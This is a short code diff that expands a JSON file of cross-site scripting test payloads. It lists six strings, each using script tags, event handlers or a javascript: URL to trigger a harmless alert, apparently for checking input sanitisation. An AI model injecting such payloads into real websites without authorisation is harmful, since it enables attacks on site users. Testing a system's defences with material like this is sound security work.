@@ -1,3 +1,11 @@
+// Archivo: xss_payloads.json
 {
-  "payload": "<script>alert('XSS');</script>"
+  "payloads": [
+    "<script>alert('XSS1')</script>",
+    "<script>alert('XSS');</script>",
+    "<img src=\"x\" onerror=\"alert('XSS2')\">",
+    "<svg onload=\"alert('XSS3')\">",
+    "<body onload=\"alert('XSS4')\">",
+    "<iframe src=\"javascript:alert('XSS5')\"></iframe>"
+  ]
 }
